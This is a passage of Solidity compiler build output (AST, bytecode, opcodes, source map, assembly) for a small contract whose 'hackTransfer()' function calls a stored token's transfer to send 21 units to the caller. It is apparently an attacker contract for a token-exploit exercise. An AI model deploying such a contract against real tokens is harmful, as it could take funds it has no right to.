												"body": {
													"nodeType": "YulBlock",
													"src": "2173:76:2",
													"statements": [
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2227:16:2",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2236:1:2",
																					"type": "",
																					"value": "0"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "2239:1:2",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "revert",
																				"nodeType": "YulIdentifier",
																				"src": "2229:6:2"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2229:12:2"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2229:12:2"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "2196:5:2"
																			},
																			{
																				"arguments": [
																					{
																						"name": "value",
																						"nodeType": "YulIdentifier",
																						"src": "2218:5:2"
																					}
																				],
																				"functionName": {
																					"name": "cleanup_t_bool",
																					"nodeType": "YulIdentifier",
																					"src": "2203:14:2"
																				},
																				"nodeType": "YulFunctionCall",
																				"src": "2203:21:2"
																			}
																		],
																		"functionName": {
																			"name": "eq",
																			"nodeType": "YulIdentifier",
																			"src": "2193:2:2"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "2193:32:2"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "2186:6:2"
																},
																"nodeType": "YulFunctionCall",
																"src": "2186:40:2"
															},
															"nodeType": "YulIf",
															"src": "2183:2:2"
														}
													]
												},
												"name": "validator_revert_t_bool",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2166:5:2",
														"type": ""
													}
												],
												"src": "2133:116:2"
											}
										]
									},
									"contents": "{\n\n    function abi_decode_t_bool_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert(0, 0) }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_address_to_t_address_fromStack(value, pos) {\n        mstore(pos, cleanup_t_address(value))\n    }\n\n    function abi_encode_t_contract$_Token_$71_to_t_address_fromStack(value, pos) {\n        mstore(pos, convert_t_contract$_Token_$71_to_t_address(value))\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_address_t_uint256__to_t_address_t_uint256__fromStack_reversed(headStart , value1, value0) -> tail {\n        tail := add(headStart, 64)\n\n        abi_encode_t_address_to_t_address_fromStack(value0,  add(headStart, 0))\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value1,  add(headStart, 32))\n\n    }\n\n    function abi_encode_tuple_t_contract$_Token_$71__to_t_address__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_contract$_Token_$71_to_t_address_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function convert_t_contract$_Token_$71_to_t_address(value) -> converted {\n        converted := convert_t_contract$_Token_$71_to_t_uint160(value)\n    }\n\n    function convert_t_contract$_Token_$71_to_t_uint160(value) -> converted {\n        converted := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n}\n",
									"id": 2,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100365760003560e01c80631191c0871461003b578063fc0c546a14610045575b600080fd5b610043610063565b005b61004d610120565b60405161005a91906101d8565b60405180910390f35b600033905060006015905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a9059cbb83836040518363ffffffff1660e01b81526004016100c99291906101af565b602060405180830381600087803b1580156100e357600080fd5b505af11580156100f7573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061011b9190610159565b505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b6000815190506101538161025f565b92915050565b60006020828403121561016b57600080fd5b600061017984828501610144565b91505092915050565b61018b816101f3565b82525050565b61019a8161023b565b82525050565b6101a981610231565b82525050565b60006040820190506101c46000830185610182565b6101d160208301846101a0565b9392505050565b60006020820190506101ed6000830184610191565b92915050565b60006101fe82610211565b9050919050565b60008115159050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b60006102468261024d565b9050919050565b600061025882610211565b9050919050565b61026881610205565b811461027357600080fd5b5056fea2646970667358221220baa141757f5ecfb978f508cb70f7619c7ac1a347ea0d098642829fa08bf4c46464736f6c63430008010033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1191C087 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xFC0C546A EQ PUSH2 0x45 JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x43 PUSH2 0x63 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x4D PUSH2 0x120 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x5A SWAP2 SWAP1 PUSH2 0x1D8 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 CALLER SWAP1 POP PUSH1 0x0 PUSH1 0x15 SWAP1 POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xA9059CBB DUP4 DUP4 PUSH1 0x40 MLOAD DUP4 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0xC9 SWAP3 SWAP2 SWAP1 PUSH2 0x1AF JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0xE3 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0xF7 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x11B SWAP2 SWAP1 PUSH2 0x159 JUMP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x153 DUP2 PUSH2 0x25F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x16B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x179 DUP5 DUP3 DUP6 ADD PUSH2 0x144 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x18B DUP2 PUSH2 0x1F3 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x19A DUP2 PUSH2 0x23B JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH2 0x1A9 DUP2 PUSH2 0x231 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x1C4 PUSH1 0x0 DUP4 ADD DUP6 PUSH2 0x182 JUMP JUMPDEST PUSH2 0x1D1 PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x1A0 JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1ED PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x191 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1FE DUP3 PUSH2 0x211 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x246 DUP3 PUSH2 0x24D JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x258 DUP3 PUSH2 0x211 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x268 DUP2 PUSH2 0x205 JUMP JUMPDEST DUP2 EQ PUSH2 0x273 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 0xBA LOG1 COINBASE PUSH22 0x7F5ECFB978F508CB70F7619C7AC1A347EA0D09864282 SWAP16 LOG0 DUP12 DELEGATECALL 0xC4 PUSH5 0x64736F6C63 NUMBER STOP ADDMOD ADD STOP CALLER ",
							"sourceMap": "102:294:1:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;233:158;;;:::i;:::-;;127:18;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;233:158;275:16;294:10;275:29;;315:14;332:6;315:23;;351:5;;;;;;;;;;:14;;;366:8;376:6;351:32;;;;;;;;;;;;;;;;:::i;:::-;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;:::i;:::-;;233:158;;:::o;127:18::-;;;;;;;;;;;;:::o;7:137:2:-;;92:6;86:13;77:22;;108:30;132:5;108:30;:::i;:::-;67:77;;;;:::o;150:278::-;;266:2;254:9;245:7;241:23;237:32;234:2;;;282:1;279;272:12;234:2;325:1;350:61;403:7;394:6;383:9;379:22;350:61;:::i;:::-;340:71;;296:125;224:204;;;;:::o;434:118::-;521:24;539:5;521:24;:::i;:::-;516:3;509:37;499:53;;:::o;558:155::-;657:49;700:5;657:49;:::i;:::-;652:3;645:62;635:78;;:::o;719:118::-;806:24;824:5;806:24;:::i;:::-;801:3;794:37;784:53;;:::o;843:332::-;;1002:2;991:9;987:18;979:26;;1015:71;1083:1;1072:9;1068:17;1059:6;1015:71;:::i;:::-;1096:72;1164:2;1153:9;1149:18;1140:6;1096:72;:::i;:::-;969:206;;;;;:::o;1181:246::-;;1324:2;1313:9;1309:18;1301:26;;1337:83;1417:1;1406:9;1402:17;1393:6;1337:83;:::i;:::-;1291:136;;;;:::o;1433:96::-;;1499:24;1517:5;1499:24;:::i;:::-;1488:35;;1478:51;;;:::o;1535:90::-;;1612:5;1605:13;1598:21;1587:32;;1577:48;;;:::o;1631:126::-;;1708:42;1701:5;1697:54;1686:65;;1676:81;;;:::o;1763:77::-;;1829:5;1818:16;;1808:32;;;:::o;1846:150::-;;1941:49;1984:5;1941:49;:::i;:::-;1928:62;;1918:78;;;:::o;2002:125::-;;2097:24;2115:5;2097:24;:::i;:::-;2084:37;;2074:53;;;:::o;2133:116::-;2203:21;2218:5;2203:21;:::i;:::-;2196:5;2193:32;2183:2;;2239:1;2236;2229:12;2183:2;2173:76;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "136800",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"hackTransfer()": "infinite",
								"token()": "1254"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 102,
									"end": 396,
									"name": "PUSH",
									"source": 1,
									"value": "80"
								},
								{
									"begin": 102,
									"end": 396,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 102,
									"end": 396,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "CALLVALUE",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "ISZERO",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 152,
									"end": 225,
									"name": "JUMPI",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 152,
									"end": 225,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "REVERT",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "tag",
									"source": 1,
									"value": "1"
								},
								{
									"begin": 152,
									"end": 225,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 152,
									"end": 225,
									"name": "MLOAD",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "PUSHSIZE",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "CODESIZE",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "SUB",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "PUSHSIZE",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "PUSH",
									"source": 1,
									"value": "40"
								},
								{
									"begin": 152,
									"end": 225,
									"name": "MSTORE",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "ADD",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 152,
									"end": 225,
									"name": "SWAP2",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "3"
								},
								{
									"begin": 152,
									"end": 225,
									"name": "JUMP",
									"source": 1,
									"value": "[in]"
								},
								{
									"begin": 152,
									"end": 225,
									"name": "tag",
									"source": 1,
									"value": "2"
								},
								{
									"begin": 152,
									"end": 225,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 210,
									"end": 216,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 196,
									"end": 201,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 196,
									"end": 201,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 196,
									"end": 217,
									"name": "PUSH",
									"source": 1,
									"value": "100"
								},
								{
									"begin": 196,
									"end": 217,
									"name": "EXP",
									"source": 1
								},
								{
									"begin": 196,
									"end": 217,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 196,
									"end": 217,
									"name": "SLOAD",
									"source": 1
								},
								{
									"begin": 196,
									"end": 217,
									"name": "DUP2",
									"source": 1
								},
								{
									"begin": 196,
									"end": 217,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 196,
									"end": 217,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 196,
									"end": 217,
									"name": "NOT",
									"source": 1
								},
								{
									"begin": 196,
									"end": 217,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 196,
									"end": 217,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 196,
									"end": 217,
									"name": "DUP4",
									"source": 1
								},
								{
									"begin": 196,
									"end": 217,
									"name": "PUSH",
									"source": 1,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 196,
									"end": 217,
									"name": "AND",
									"source": 1
								},
								{
									"begin": 196,
									"end": 217,
									"name": "MUL",
									"source": 1
								},
								{
									"begin": 196,
									"end": 217,
									"name": "OR",
									"source": 1
								},
								{
									"begin": 196,
									"end": 217,
									"name": "SWAP1",
									"source": 1
								},
								{
									"begin": 196,
									"end": 217,
									"name": "SSTORE",
									"source": 1
								},
								{
									"begin": 196,
									"end": 217,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 152,
									"end": 225,
									"name": "POP",
									"source": 1
								},
								{
									"begin": 102,
									"end": 396,
									"name": "PUSH [tag]",
									"source": 1,
									"value": "6"
								},
								{
									"begin": 102,
									"end": 396,
									"name": "JUMP",
									"source": 1
								},
								{
									"begin": 7,
									"end": 150,
									"name": "tag",
									"source": 2,
									"value": "8"
								},
								{
									"begin": 7,
									"end": 150,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 7,
									"end": 150,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 95,
									"end": 101,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 89,
									"end": 102,
									"name": "MLOAD",
									"source": 2
								},
								{
									"begin": 80,
									"end": 102,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 80,
									"end": 102,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 111,
									"end": 144,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "10"
								},
								{
									"begin": 138,
									"end": 143,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 111,
									"end": 144,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "11"
								},
								{
									"begin": 111,
									"end": 144,
									"name": "JUMP",
									"source": 2,
									"value": "[in]"
								},
								{
									"begin": 111,
									"end": 144,
									"name": "tag",
									"source": 2,
									"value": "10"
								},
								{
									"begin": 111,
									"end": 144,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 70,
									"end": 150,
									"name": "SWAP3",
									"source": 2
								},
								{
									"begin": 70,
									"end": 150,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 70,
									"end": 150,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 70,
									"end": 150,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 70,
									"end": 150,
									"name": "JUMP",
									"source": 2,
									"value": "[out]"
								},
								{
									"begin": 156,
									"end": 440,
									"name": "tag",
									"source": 2,
									"value": "3"
								},
								{
									"begin": 156,
									"end": 440,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 156,
									"end": 440,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 275,
									"end": 277,
									"name": "PUSH",
									"source": 2,
									"value": "20"
								},
								{
									"begin": 263,
									"end": 272,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 254,
									"end": 261,
									"name": "DUP5",
									"source": 2
								},
								{
									"begin": 250,
									"end": 273,
									"name": "SUB",
									"source": 2
								},
								{
									"begin": 246,
									"end": 278,
									"name": "SLT",
									"source": 2
								},
								{
									"begin": 243,
									"end": 245,
									"name": "ISZERO",
									"source": 2
								},
								{
									"begin": 243,
									"end": 245,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "13"
								},
								{
									"begin": 243,
									"end": 245,
									"name": "JUMPI",
									"source": 2
								},
								{
									"begin": 291,
									"end": 292,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 288,
									"end": 289,
									"name": "DUP1",
									"source": 2
								},
								{
									"begin": 281,
									"end": 293,
									"name": "REVERT",
									"source": 2
								},
								{
									"begin": 243,
									"end": 245,
									"name": "tag",
									"source": 2,
									"value": "13"
								},
								{
									"begin": 243,
									"end": 245,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 334,
									"end": 335,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 359,
									"end": 423,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "14"
								},
								{
									"begin": 415,
									"end": 422,
									"name": "DUP5",
									"source": 2
								},
								{
									"begin": 406,
									"end": 412,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 395,
									"end": 404,
									"name": "DUP6",
									"source": 2
								},
								{
									"begin": 391,
									"end": 413,
									"name": "ADD",
									"source": 2
								},
								{
									"begin": 359,
									"end": 423,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "8"
								},
								{
									"begin": 359,
									"end": 423,
									"name": "JUMP",
									"source": 2,
									"value": "[in]"
								},
								{
									"begin": 359,
									"end": 423,
									"name": "tag",
									"source": 2,
									"value": "14"
								},
								{
									"begin": 359,
									"end": 423,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 349,
									"end": 423,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 349,
									"end": 423,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 305,
									"end": 433,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 233,
									"end": 440,
									"name": "SWAP3",
									"source": 2
								},
								{
									"begin": 233,
									"end": 440,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 233,
									"end": 440,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 233,
									"end": 440,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 233,
									"end": 440,
									"name": "JUMP",
									"source": 2,
									"value": "[out]"
								},
								{
									"begin": 446,
									"end": 542,
									"name": "tag",
									"source": 2,
									"value": "15"
								},
								{
									"begin": 446,
									"end": 542,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 446,
									"end": 542,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 512,
									"end": 536,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "17"
								},
								{
									"begin": 530,
									"end": 535,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 512,
									"end": 536,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "18"
								},
								{
									"begin": 512,
									"end": 536,
									"name": "JUMP",
									"source": 2,
									"value": "[in]"
								},
								{
									"begin": 512,
									"end": 536,
									"name": "tag",
									"source": 2,
									"value": "17"
								},
								{
									"begin": 512,
									"end": 536,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 501,
									"end": 536,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 501,
									"end": 536,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 491,
									"end": 542,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 491,
									"end": 542,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 491,
									"end": 542,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 491,
									"end": 542,
									"name": "JUMP",
									"source": 2,
									"value": "[out]"
								},
								{
									"begin": 548,
									"end": 674,
									"name": "tag",
									"source": 2,
									"value": "18"
								},
								{
									"begin": 548,
									"end": 674,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 548,
									"end": 674,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 625,
									"end": 667,
									"name": "PUSH",
									"source": 2,
									"value": "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
								},
								{
									"begin": 618,
									"end": 623,
									"name": "DUP3",
									"source": 2
								},
								{
									"begin": 614,
									"end": 668,
									"name": "AND",
									"source": 2
								},
								{
									"begin": 603,
									"end": 668,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 603,
									"end": 668,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 593,
									"end": 674,
									"name": "SWAP2",
									"source": 2
								},
								{
									"begin": 593,
									"end": 674,
									"name": "SWAP1",
									"source": 2
								},
								{
									"begin": 593,
									"end": 674,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 593,
									"end": 674,
									"name": "JUMP",
									"source": 2,
									"value": "[out]"
								},
								{
									"begin": 680,
									"end": 802,
									"name": "tag",
									"source": 2,
									"value": "11"
								},
								{
									"begin": 680,
									"end": 802,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 753,
									"end": 777,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "21"
								},
								{
									"begin": 771,
									"end": 776,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 753,
									"end": 777,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "15"
								},
								{
									"begin": 753,
									"end": 777,
									"name": "JUMP",
									"source": 2,
									"value": "[in]"
								},
								{
									"begin": 753,
									"end": 777,
									"name": "tag",
									"source": 2,
									"value": "21"
								},
								{
									"begin": 753,
									"end": 777,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 746,
									"end": 751,
									"name": "DUP2",
									"source": 2
								},
								{
									"begin": 743,
									"end": 778,
									"name": "EQ",
									"source": 2
								},
								{
									"begin": 733,
									"end": 735,
									"name": "PUSH [tag]",
									"source": 2,
									"value": "22"
								},
								{
									"begin": 733,
									"end": 735,
									"name": "JUMPI",
									"source": 2
								},
								{
									"begin": 792,
									"end": 793,
									"name": "PUSH",
									"source": 2,
									"value": "0"
								},
								{
									"begin": 789,
									"end": 790,
									"name": "DUP1",
									"source": 2
								},
								{
									"begin": 782,
									"end": 794,
									"name": "REVERT",
									"source": 2
								},
								{
									"begin": 733,
									"end": 735,
									"name": "tag",
									"source": 2,
									"value": "22"
								},
								{
									"begin": 733,
									"end": 735,
									"name": "JUMPDEST",
									"source": 2
								},
								{
									"begin": 723,
									"end": 802,
									"name": "POP",
									"source": 2
								},
								{
									"begin": 723,
									"end": 802,
									"name": "JUMP",
									"source": 2,
									"value": "[out]"
								},
								{
									"begin": 102,
									"end": 396,
									"name": "tag",
									"source": 1,
									"value": "6"
								},
								{
									"begin": 102,
									"end": 396,
									"name": "JUMPDEST",
									"source": 1
								},
								{
									"begin": 102,
									"end": 396,
									"name": "PUSH #[$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 102,
									"end": 396,
									"name": "DUP1",
									"source": 1
								},
								{
									"begin": 102,
									"end": 396,
									"name": "PUSH [$]",
									"source": 1,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 102,
									"end": 396,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 102,
									"end": 396,
									"name": "CODECOPY",
									"source": 1
								},
								{
									"begin": 102,
									"end": 396,
									"name": "PUSH",
									"source": 1,
									"value": "0"
								},
								{
									"begin": 102,
									"end": 396,
									"name": "RETURN",
									"source": 1
								}
							],
							".data": {
								"0": {
									".auxdata": "a2646970667358221220baa141757f5ecfb978f508cb70f7619c7ac1a347ea0d098642829fa08bf4c46464736f6c63430008010033",
									".code": [
										{
											"begin": 102,
											"end": 396,
											"name": "PUSH",
											"source": 1,
											"value": "80"
										},
										{
											"begin": 102,
											"end": 396,
											"name": "PUSH",
											"source": 1,
											"value": "40"
										},
										{
											"begin": 102,
											"end": 396,
											"name": "MSTORE",
											"source": 1
										},
										{
											"begin": 102,
											"end": 396,
											"name": "CALLVALUE",
											"source": 1
										},
										{
											"begin": 102,
											"end": 396,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 102,
											"end": 396,
											"name": "ISZERO",
											"source": 1
										},
										{
											"begin": 102,
											"end": 396,
											"name": "PUSH [tag]",
											"source": 1,
											"value": "1"
										},
										{
											"begin": 102,
											"end": 396,
											"name": "JUMPI",
											"source": 1
										},
										{
											"begin": 102,
											"end": 396,
											"name": "PUSH",
											"source": 1,
											"value": "0"
										},
										{
											"begin": 102,
											"end": 396,
											"name": "DUP1",
											"source": 1
										},
										{
											"begin": 102,
